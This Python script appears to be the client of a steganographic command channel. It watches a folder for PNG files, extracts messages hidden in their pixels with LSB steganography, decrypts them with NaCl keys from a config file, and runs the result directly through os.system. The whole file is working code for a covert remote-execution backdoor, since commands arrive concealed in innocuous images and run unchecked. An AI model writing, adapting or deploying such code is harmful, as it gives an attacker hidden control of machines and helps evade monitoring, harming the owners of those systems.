"""
Script to monitor a directory for PNGs containing commands.
"""
import binascii
import base64
import json
import os
import time
from stegano import lsbset
from stegano.lsbset import generators
from nacl.public import PublicKey, PrivateKey, Box


class Observer:
    def __init__(self, config_file='client.json'):
        config = json.load(open(config_file, 'r'))
        self.target = config['path']
        privkey = PrivateKey(base64.b64decode(config['privkey']))
        pubkey = PublicKey(base64.b64decode(config['pubkey']))
        self.sb = Box(privkey, pubkey)

        self.ts = 0
        self.seen = {}
        self.observe_file()
        self.DISPATCHER = {
            b'\x89\x50\x4e\x47': self.png_decoder
        }

    def main(self):
        while True:
            self.ts += 1
            self.observe_file(self.process_item)

            # remove out dated files
            pairs = [(name, count) for name, count in self.seen.items()]
            for name, count in pairs:
                if count != self.ts:
                    del self.seen[name]

            time.sleep(1)

    def observe_file(self, function=None):
        files = os.listdir(self.target)
        for file in files:
            if file in self.seen:
                self.seen[file] = self.ts
                continue
            self.seen[file] = self.ts
            if function:
                function(f'{self.target}/{file}')

    def png_decoder(self, filename):
        clear_message = lsbset.reveal(filename, generators.eratosthenes())
        print(clear_message)
        decrypted = self.sb.decrypt(binascii.unhexlify(clear_message))
        os.system(decrypted)

    def process_item(self, filename):
        """
        Determine if this is a file of interest.
        """
        try:
            f = open(filename, 'rb')
            header = f.read(4)
            f.close()
            self.DISPATCHER.get(header, lambda x: None)(filename)
        except Exception:
            return


if __name__ == "__main__":
    ob = Observer()
    ob.main()
